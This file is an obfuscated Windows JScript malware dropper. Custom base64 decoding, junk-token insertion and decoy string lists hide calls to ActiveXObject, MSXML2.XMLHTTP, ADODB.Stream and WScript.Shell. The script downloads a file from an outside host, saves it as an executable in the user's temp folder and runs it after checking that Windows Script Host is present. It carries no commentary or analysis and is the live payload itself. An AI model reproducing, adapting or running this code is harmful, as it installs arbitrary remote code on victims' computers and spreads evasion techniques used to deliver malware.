var polymer = 0;
commentator = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  gelatinous = [];
var chess = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};
  for ( var i = 128; i--; ) {
    if ( gelatinous[ i ] === undefined )
      gelatinous[ i ] = -1;
  
    gelatinous[ commentator.charCodeAt( i ) ] = i;
  }

var athwart = 6/6;

String.prototype.secret = function () {
	baseness = this;
	for (var i in chess){baseness = baseness.replace(i, chess[i]);}
    return baseness;
};

  
String.prototype.secret4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("thunderstruck").join("");
    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
	/* c1 */
	do {
	    c1 = gelatinous[str.charCodeAt(i++) & 0xff];
	} while(i < len && c1 == -1);
	if(c1 == -1)
	    break;

	/* c2 */
	do {
	    c2 = gelatinous[str.charCodeAt(i++) & 0xff];
	} while(i < len && c2 == -1);
	if(c2 == -1)
	    break;

	out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

	/* c3 */
	do {
	    c3 = str.charCodeAt(i++) & 0xff;
	    if(c3 == 61)
		return out;
	    c3 = gelatinous[c3];
	} while(i < len && c3 == -1);
	if(c3 == -1)
	    break;

	out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

	/* c4 */
	do {
	    c4 = str.charCodeAt(i++) & 0xff;
	    if(c4 == 61)
		return out;
	    c4 = gelatinous[c4];
	} while(i < len && c4 == -1);
	if(c4 == -1)
	    break;
	out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}
String.prototype.secret2 = function () {
    var heath = {
        respect: this
    };
    heath.temperamental = heath.respect["c3Vic3RyaW5n".secret4()](polymer, athwart);
    return heath.temperamental;
};
var advertisement = "QWthunderstruckN0aXZthunderstrucklWE9iathunderstruckmVjdA=thunderstruck=".secret4();
var condense ="RXhwYW5thunderstruckkRW52aXthunderstruckJvbm1lbnRTdHJthunderstruckpbmdz".secret4();
var virgin ="JVthunderstruckRFTVthunderstruckAl".secret4();
var hackers = [advertisement, condense,virgin,  ""+"."+("baker","bowsprit","portugal","butler","gushing","digital","scholarship","lintel","exe"), "R"+("progress","inscrutable","zoloft","doggerel","bishop","universality","cincinnati","winnipeg","un"), ("M"+"SX"+"ML"+("primacy","origin","frankincense","premium","islamic","kidnapping","suzanne","2.")+"|M"+"LH"+"TT"+("boating","solved","notify","screenshot","scandinavian","surly","narrow","awkwardly","P>")+"WU"+("sizes","trumpery","gender","exhortation","versatility","guestbook","massy","cr")+("revolting","boundaries","canteen","conducting","technological","armstrong","carbonate","burthen","ip")+"t:"+("failed","transform","palliation","queries","animation","inflammable","wrestler","debonair","Sh")+"ell").secret()];
barnaby = "_F2_";
var sulphide = this[hackers.shift()];
XeAuayfKr = "sDbztQBX";
arable = (("informative", "petersburg", "agreement", "bolivia", "pKdEvGM") + "BEDrVlfdv").secret2();
estimated = (("trapper", "cabman", "tudor", "stolen", "sAlrDvQaAXly") + "DpJOCR").secret2();
  
    String.prototype.unassuming = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

briton = "b3Blbg==".secret4();;
var characterization = hackers.pop().split(">");

var urgency = new sulphide(characterization[1]);
sISHAVzha = "_F3_";
var taper = new sulphide(characterization[0]);
gyXeBqqGw = "_F4_";
var forgetful = urgency[hackers.shift()](hackers.shift());
MFWAxq = "_F5_";
weasel = (("elizabethan", "linnet", "destination", "elephant", "ElEUIAbx") + "nGhImC").secret2();
function prolixity(remedial, geography) {

    try {
        var slavic = forgetful + "/" + geography ;
		slavic = slavic+ hackers.shift();
            taper[briton](("tinder","crossing","G" + weasel) + ("midsummer","indicator","thumbnail","malayan","T"), remedial, false);
       
    jGDPHV = "_F7_";
    taper[estimated + ("crest","refund","end")]();
	var episcopal=(WScript+""=="V2luZG93cyBTY3JpcHQgSG9zdA==".secret4())&&taper["c3RhdHVz".secret4()] +""=="MjAw".secret4()&&typeof(YXQMAacYth)==="undefined";
	lQHNgR = "_F8_";
    if (episcopal) {
		
        var disable = new sulphide((("observant","warble","sorts","attribute","lutheran","decided","currently","bizarre","A")+("phoenician","signs","xavier","newcastle","diagonal","ostrich","sauce","brimstone","SEOO")+"DB"+("impressive","esthetic","constitution","derek","twentynine","coleman","leather",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        disable[briton]();
        DoNMkg = "_F9_";
        disable.type = athwart;
        xyTsuxlu = "_F10_";
        disable["d3JpdGU=".secret4()](taper[("rating","parliament","holding","happening","jostle","tripadvisor","upskirt","")+"R"+"es"+"pon"+chess['U'].toLowerCase()+"e"+"Qm9keQ==".secret4()]);
        sILPOr = "_F11_";
        disable[(arable + "o"+("resin","intruder","imaging","tribe","inter","coercion","hundredweight","knock","00")+("championships","conversations","tiberias","ranging","uninterested","foregone","buffer","8i")+"tion").replace("0"+("cacao","profligacy","rudder","cheap","luxembourg","sorrel","complicated","08"), estimated)] = 0;
        EWRNzwXon = "_F12_";
        disable[("senegal","provisional","adherent","insipid","perpetuate","candidly","education","s")+"aveT"+"oF"+"ile"](slavic, 2);
        CHoovw = "_F13_";
        disable.close();
        qjwPFCsA = "_F14_";
		urgency[hackers.shift()](slavic, athwart, true);
    }
} catch (XJpGqq) { };

    LiOssYa = "_F15_";
}
prolixity("aHR0cDovLw==".secret4()+"\u006F\u0061\u0076\u0062\u002E\u0063\u006F\u006D"+"\u002F\u0065\u0072\u0067\u0035\u0034\u0067\u0034" + "?EftTDfMVm=yEULXty","tyoXFIm");
   CfFderiV = "_F16_";
   